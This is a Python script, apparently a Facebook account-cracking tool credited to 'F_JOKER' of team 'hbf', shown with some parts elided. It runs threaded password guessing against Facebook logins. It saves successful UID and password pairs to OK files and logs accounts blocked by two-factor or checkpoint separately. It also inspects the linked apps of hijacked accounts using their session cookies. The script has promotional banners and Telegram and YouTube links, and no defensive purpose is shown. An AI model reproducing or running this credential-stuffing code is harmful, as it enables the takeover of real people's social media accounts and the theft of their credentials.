#created by F_JOKER
#team name hbf
#tottaly written by F_JOKER 360 Khawaja
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; F_JOKER \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
ha = current.day
today = date.today()
F_JOKER2 = f"\033[1;33m➤{GREEN}➤\x1b[0m"
import random
cokbrut=[]
...
\033[1;31m│\033[1;37m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m ➟   \033[1;32m   𝑴𝑹-𝑱𝑶𝑲𝑬𝑹 𝟑𝟔𝟎         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32m𝐓𝐄𝐑𝐄𝐆𝐑𝐀𝐌   \033[1;31m ➟  \033[1;32m    t.me/𝐌𝐑 𝐒𝐇𝐀𝐇𝐈 𝐉𝐎𝐊𝐄𝐑    \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31mv ➟   \033[1;32m    𝑴𝑹-𝑱𝑶𝑲𝑬𝑹 𝟑𝟔𝟎    \033[1;31m   
...
𝐌𝐑-𝐉𝐎𝐊𝐄𝐑 =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR  NAME 😘: ')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        for i in range(len(game)):
            ...
            #created by hbf team(owner) F_JOKER
...
def XYZ():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════')
    print(f"\t      {WHITE}[{EXTRA} {F_JOKERT()} {WHITE}]")
    print(f" {GREEN}𝐌𝐑-𝐉𝐎𝐊𝐄𝐑-𝑲𝑯𝑨𝑵𝑶𝑶          {WHITE}: {GREEN}Mr {ORANGE} {𝐌𝐑-𝐉𝐎𝐊𝐄𝐑}")
    print(f"{BLUE}══════════════════════════════════════════════════")
    ...
    print(f"\033[1;91m====================================================")
    F_JOKER = input("[√] CHOOSE : ")
    if F_JOKER in ["1","01"]:
        passx()
    elif F_JOKER in ["2","02"]:
        os.system("xdg-open https://t.me/زندانی جوکر")
        XYZ()
    elif F_JOKER in ["3","03"]:
        os.system("xdg-open https://www.youtube.com/@F_JOKER-360")
        XYZ()
    elif F_JOKER in ["0","00"]:
       exit()
    else:
...
def pass1():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        print(f" {WHITE}USER NAME             : {BLUE}"+𝐌𝐑-𝐉𝐎𝐊𝐄𝐑)
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcaF_JOKER/F_JOKER-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcaF_JOKER/F_JOKER-CP.txt')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                #os.system("play-audio F_JOKER_OK.mp3")
                print(f'\r{GREEN}[OK] '+uid+' [√] '+ps+ ' '+Jawnx(uid)+' ')
                cek_apk(session,coki)
                open('/sdcaF_JOKER/F_JOKER-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                    #os.system("play-audio F_JOKER_2F.mp3")
                    print('\r\033[1;34m[2F] '+uid+' [~] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcaF_JOKER/F_JOKER-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    coki1 = coki.split("1000")[1]
                    uid = "1000"+coki1[0:11]
                  #  os.system("play-audio F_JOKER_CP.mp3")
                    print(f'\r{RED}[CP] '+uid+' [×] '+ps+' '+Jawnx(uid)+' ')
                    open('/sdcaF_JOKER/F_JOKER-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[𝑴𝑹-𝑱𝑶𝑲𝑬𝑹 🔥] [%s] \33[1;97m[OK:%s{F_JOKER2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
